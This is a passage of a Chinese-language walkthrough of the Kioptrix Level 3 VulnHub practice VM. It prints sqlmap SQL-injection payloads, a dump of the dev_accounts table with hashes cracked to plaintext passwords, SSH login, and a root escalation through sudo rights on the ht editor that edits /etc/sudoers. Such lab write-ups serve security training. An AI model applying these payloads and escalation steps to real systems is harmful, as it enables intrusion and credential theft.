class="number">0883</span>   <span class="number">6.9</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">0883</span></span><br><span class="line">|       CVE-<span class="number">2018</span>-<span class="number">1312</span>   <span class="number">6.8</span>     https://vulners.com/cve/CVE-<span class="number">2018</span>-<span class="number">1312</span></span><br><span class="line">|       CVE-<span class="number">2013</span>-<span class="number">1862</span>   <span class="number">5.1</span>     https://vulners.com/cve/CVE-<span class="number">2013</span>-<span class="number">1862</span></span><br><span class="line">|       CVE-<span class="number">2014</span>-<span class="number">0231</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2014</span>-<span class="number">0231</span></span><br><span class="line">|       CVE-<span class="number">2014</span>-<span class="number">0098</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2014</span>-<span class="number">0098</span></span><br><span class="line">|       CVE-<span class="number">2013</span>-<span class="number">6438</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2013</span>-<span class="number">6438</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">3368</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">3368</span></span><br><span class="line">|       CVE-<span class="number">2010</span>-<span class="number">1452</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2010</span>-<span class="number">1452</span></span><br><span class="line">|       CVE-<span class="number">2010</span>-<span class="number">0408</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2010</span>-<span class="number">0408</span></span><br><span class="line">|       CVE-<span class="number">2009</span>-<span class="number">2699</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2009</span>-<span class="number">2699</span></span><br><span class="line">|       CVE-<span class="number">2008</span>-<span class="number">2364</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2008</span>-<span class="number">2364</span></span><br><span class="line">|       CVE-<span class="number">2007</span>-<span class="number">6750</span>   <span class="number">5.0</span>     https://vulners.com/cve/CVE-<span class="number">2007</span>-<span class="number">6750</span></span><br><span class="line">|       CVE-<span class="number">2009</span>-<span class="number">1195</span>   <span class="number">4.9</span>     https://vulners.com/cve/CVE-<span class="number">2009</span>-<span class="number">1195</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span class="number">0031</span>   <span class="number">4.6</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">0031</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">3607</span>   <span class="number">4.4</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">3607</span></span><br><span class="line">|       CVE-<span class="number">2016</span>-<span class="number">4975</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2016</span>-<span class="number">4975</span></span><br><span class="line">|       CVE-<span class="number">2013</span>-<span class="number">1896</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2013</span>-<span class="number">1896</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span class="number">4558</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">4558</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span class="number">3499</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">3499</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span class="number">0053</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">0053</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">4317</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">4317</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">3639</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">3639</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">3348</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">3348</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">0419</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">0419</span></span><br><span class="line">|       CVE-<span class="number">2010</span>-<span class="number">0434</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2010</span>-<span class="number">0434</span></span><br><span class="line">|       CVE-<span class="number">2008</span>-<span class="number">2939</span>   <span class="number">4.3</span>     https://vulners.com/cve/CVE-<span class="number">2008</span>-<span class="number">2939</span></span><br><span class="line">|       CVE-<span class="number">2016</span>-<span class="number">8612</span>   <span class="number">3.3</span>     https://vulners.com/cve/CVE-<span class="number">2016</span>-<span class="number">8612</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span class="number">2687</span>   <span class="number">2.6</span>     https://vulners.com/cve/CVE-<span class="number">2012</span>-<span class="number">2687</span></span><br><span class="line">|_      CVE-<span class="number">2011</span>-<span class="number">4415</span>   <span class="number">1.2</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">4415</span></span><br></pre></td></tr></table></figure>
+
+<p>发现存在sqli注入和phpmyadmin目录,直接上sqlmap<br>点击下图所示位置burp抓包之后直接sqlmap跑</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt </span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.12<span class="comment">#stable&#125;                                                              </span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |                                                                              </span><br><span class="line">|___|_  [(]_|_|_|__,|  _|                                                                              </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                            </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:14:33 /2019-12-13/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:14:33] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[04:14:33] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[04:14:33] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:14:33] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: Boolean-based blind - Parameter replace (original value)</span></span><br><span class="line"><span class="string">    Payload: id=(SELECT (CASE WHEN (5293=5293) THEN 1 ELSE (SELECT 1341 UNION SELECT 9380) END))&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: id=1 OR ROW(1324,2762)&gt;(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(1324=1324,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM (SELECT 8520 UNION SELECT 1582 UNION SELECT 8916 UNION SELECT 1258)a GROUP BY x)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1 AND (SELECT 4741 FROM (SELECT(SLEEP(5)))vtbf)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: id=1 UNION ALL SELECT CONCAT(0x7171766a71,0x4d67454a425a6e796b5745656b794f584a4348714c79624d4255416243444967494975507875524d,0x7170786a71),NULL,NULL,NULL,NULL,NULL-- TpfQ&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Parameter: sort (GET)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1&amp;sort=photoid AND (SELECT 4185 FROM (SELECT(SLEEP(5)))Gmzf)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">there were multiple injection points, please select the one to use for following injections:</span></span><br><span class="line"><span class="string">[0] place: GET, parameter: id, type: Unescaped numeric (default)</span></span><br><span class="line"><span class="string">[1] place: GET, parameter: sort, type: Unescaped numeric</span></span><br><span class="line"><span class="string">[q] Quit</span></span><br><span class="line"><span class="string">[04:14:34] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:14:34] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 1 times</span></span><br><span class="line"><span class="string">[04:14:34] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/kioptrix3.com<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:14:34 /2019-12-13/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt -D gallery -T dev_accounts --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.12<span class="comment">#stable&#125;                                                              </span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |                                                                              </span></span><br><span class="line"><span class="string">|___|_  [(]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 04:18:17 /2019-12-13/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:18:17] [INFO] parsing HTTP request from &#x27;sqlmap.txt&#x27;</span></span><br><span class="line"><span class="string">[04:18:17] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[04:18:17] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[04:18:18] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: Boolean-based blind - Parameter replace (original value)</span></span><br><span class="line"><span class="string">    Payload: id=(SELECT (CASE WHEN (5293=5293) THEN 1 ELSE (SELECT 1341 UNION SELECT 9380) END))&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: id=1 OR ROW(1324,2762)&gt;(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(1324=1324,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM (SELECT 8520 UNION SELECT 1582 UNION SELECT 8916 UNION SELECT 1258)a GROUP BY x)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1 AND (SELECT 4741 FROM (SELECT(SLEEP(5)))vtbf)&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: id=1 UNION ALL SELECT CONCAT(0x7171766a71,0x4d67454a425a6e796b5745656b794f584a4348714c79624d4255416243444967494975507875524d,0x7170786a71),NULL,NULL,NULL,NULL,NULL-- TpfQ&amp;sort=photoid</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Parameter: sort (GET)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: id=1&amp;sort=photoid AND (SELECT 4185 FROM (SELECT(SLEEP(5)))Gmzf)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">there were multiple injection points, please select the one to use for following injections:</span></span><br><span class="line"><span class="string">[0] place: GET, parameter: id, type: Unescaped numeric (default)</span></span><br><span class="line"><span class="string">[1] place: GET, parameter: sort, type: Unescaped numeric</span></span><br><span class="line"><span class="string">[q] Quit</span></span><br><span class="line"><span class="string">[04:18:18] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[04:18:18] [INFO] fetching columns for table &#x27;dev_accounts&#x27; in database &#x27;gallery&#x27;</span></span><br><span class="line"><span class="string">[04:18:18] [INFO] used SQL query returns 3 entries</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] used SQL query returns 3 entries                                                    </span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;id&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;int(10)&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;username&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;varchar(50)&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;password&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;varchar(50)&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] fetching entries for table &#x27;dev_accounts&#x27; in database &#x27;gallery&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] used SQL query returns 2 entries</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;1&#x27;,&#x27;0d3eccfb887aabd50f243b3f155c0f85&#x27;,&#x27;dreg&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [WARNING] automatically patching output having last char trimmed</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] retrieved: &#x27;2&#x27;,&#x27;5badcaf789d3d1d09794d8f021f40f0e&#x27;,&#x27;loneferret&#x27;</span></span><br><span class="line"><span class="string">[04:18:19] [INFO] recognized possible password hashes in column &#x27;password&#x27;                            </span></span><br><span class="line"><span class="string">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y</span></span><br><span class="line"><span class="string">[04:18:22] [INFO] writing hashes to a temporary file &#x27;/tmp/sqlmapa2cskfzq12456/sqlmaphashes-0oyz7rlz.txt&#x27;                                                                                                     </span></span><br><span class="line"><span class="string">do you want to crack them via a dictionary-based attack? [Y/n/q] y</span></span><br><span class="line"><span class="string">[04:18:28] [INFO] using hash method &#x27;md5_generic_passwd&#x27;</span></span><br><span class="line"><span class="string">what dictionary do you want to use?</span></span><br><span class="line"><span class="string">[1] default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)</span></span><br><span class="line"><span class="string">[2] custom dictionary file</span></span><br><span class="line"><span class="string">[3] file with list of dictionary files</span></span><br><span class="line"><span class="string">&gt; 1</span></span><br><span class="line"><span class="string">[04:18:31] [INFO] using default dictionary</span></span><br><span class="line"><span class="string">do you want to use common password suffixes? (slow!) [y/N] y</span></span><br><span class="line"><span class="string">[04:18:34] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span></span><br><span class="line"><span class="string">[04:18:34] [INFO] starting 4 processes </span></span><br><span class="line"><span class="string">[04:18:39] [INFO] cracked password &#x27;starwars&#x27; for user &#x27;loneferret&#x27;                                   </span></span><br><span class="line"><span class="string">[04:18:40] [INFO] cracked password &#x27;Mast3r&#x27; for user &#x27;dreg&#x27;                                           </span></span><br><span class="line"><span class="string">Database: gallery                                                                                     </span></span><br><span class="line"><span class="string">Table: dev_accounts</span></span><br><span class="line"><span class="string">[2 entries]</span></span><br><span class="line"><span class="string">+----+---------------------------------------------+------------+</span></span><br><span class="line"><span class="string">| id | password                                    | username   |</span></span><br><span class="line"><span class="string">+----+---------------------------------------------+------------+</span></span><br><span class="line"><span class="string">| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |</span></span><br><span class="line"><span class="string">| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |</span></span><br><span class="line"><span class="string">+----+---------------------------------------------+------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[04:18:42] [INFO] table &#x27;gallery.dev_accounts&#x27; dumped to CSV file &#x27;/root/.sqlmap/output/kioptrix3.com/dump/gallery/dev_accounts.csv&#x27;                                                                          </span></span><br><span class="line"><span class="string">[04:18:42] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 1 times</span></span><br><span class="line"><span class="string">[04:18:42] [INFO] fetched data logged to text files under &#x27;/root/.sqlmap/output/kioptrix3.com&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 04:18:42 /2019-12-13/</span></span><br></pre></td></tr></table></figure>
+<p>直接用sqlmap跑出账号密码，还省去了将hash拿去解密的麻烦。之后使用这两个密码直接连接ssh即可。</p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>ssh连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh loneferret@192.168.84.144</span></span><br><span class="line">loneferret@192.168.84.144<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Ubuntu system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span></span><br><span class="line"><span class="string">applicable law.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To access official Ubuntu documentation, please visit:</span></span><br><span class="line"><span class="string">http://help.ubuntu.com/</span></span><br><span class="line"><span class="string">Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ ls</span></span><br><span class="line"><span class="string">checksec.sh  CompanyPolicy.README</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ id</span></span><br><span class="line"><span class="string">uid=1000(loneferret) gid=100(users) groups=100(users)</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ pwd</span></span><br><span class="line"><span class="string">/home/loneferret</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ whoami</span></span><br><span class="line"><span class="string">loneferret</span></span><br><span class="line"><span class="string">loneferret@Kioptrix3:~$ sudo -l</span></span><br><span class="line"><span class="string">User loneferret may run the following commands on this host:</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: !/usr/bin/su</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: /usr/local/bin/ht</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到当前登录的用户具有xterm-256color文本编辑器的sudo权限。 最初，我们可以尝试编辑&#x2F;etc&#x2F;sudoers文件，以便提升特权-为此，我们就开始吧！<br>如果由于某种原因在尝试运行sudo ht时出现错误，则只需像下面所做的那样将xtrem-color导出为TERM。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht /etc/sudoers </span><br><span class="line">Error opening terminal: xterm-256color.</span><br><span class="line">loneferret@Kioptrix3:~$ <span class="built_in">export</span> TERM=xterm-color</span><br><span class="line">loneferret@Kioptrix3:~$ sudo ht /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这样打开sudoers文件。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub49.jpg"></p>
+<p>从这里按F3，然后输入&#x2F;etc&#x2F;sudoers,回车,再下图中的位置输入[, &#x2F;bin&#x2F;sh]，然后F10选择yes然后保存。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub50.jpg"></p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub51.jpg"></p>
+<p>输入下面命令，成功由普通用户变为root用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo /bin/sh</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/loneferret</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># cat Congrats.txt</span></span><br><span class="line">Good <span class="keyword">for</span> you <span class="keyword">for</span> getting here.</span><br><span class="line">Regardless of the matter (staying within the spirit of the game of course)</span><br><span class="line">you got here, congratulations are <span class="keyword">in</span> order. Wasn<span class="string">&#x27;t that bad now was it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Went in a different direction with this VM. Exploit based challenges are</span></span><br><span class="line"><span class="string">nice. Helps workout that information gathering part, but sometimes we</span></span><br><span class="line"><span class="string">need to get our hands dirty in other things as well.</span></span><br><span class="line"><span class="string">Again, these VMs are beginner and not intented for everyone. </span></span><br><span class="line"><span class="string">Difficulty is relative, keep that in mind.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The object is to learn, do some research and have a little (legal)</span></span><br><span class="line"><span class="string">fun in the process.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you enjoyed this third challenge.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Steven McElrea</span></span><br><span class="line"><span class="string">aka loneferret</span></span><br><span class="line"><span class="string">http://www.kioptrix.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Credit needs to be given to the creators of the gallery webapp and CMS used</span></span><br><span class="line"><span class="string">for the building of the Kioptrix VM3 site.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Main page CMS: </span></span><br><span class="line"><span class="string">http://www.lotuscms.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Gallery application: </span></span><br><span class="line"><span class="string">Gallarific 2.1 - Free Version released October 10, 2009</span></span><br><span class="line"><span class="string">http://www.gallarific.com</span></span><br><span class="line"><span class="string">Vulnerable version of this application can be downloaded</span></span><br><span class="line"><span class="string">from the Exploit-DB website:</span></span><br><span class="line"><span class="string">http://www.exploit-db.com/exploits/15891/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The HT Editor can be found here:</span></span><br><span class="line"><span class="string">http://hte.sourceforge.net/downloads.html</span></span><br><span class="line"><span class="string">And the vulnerable version on Exploit-DB here:</span></span><br><span class="line"><span class="string">http://www.exploit-db.com/exploits/17083/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Also, all pictures were taken 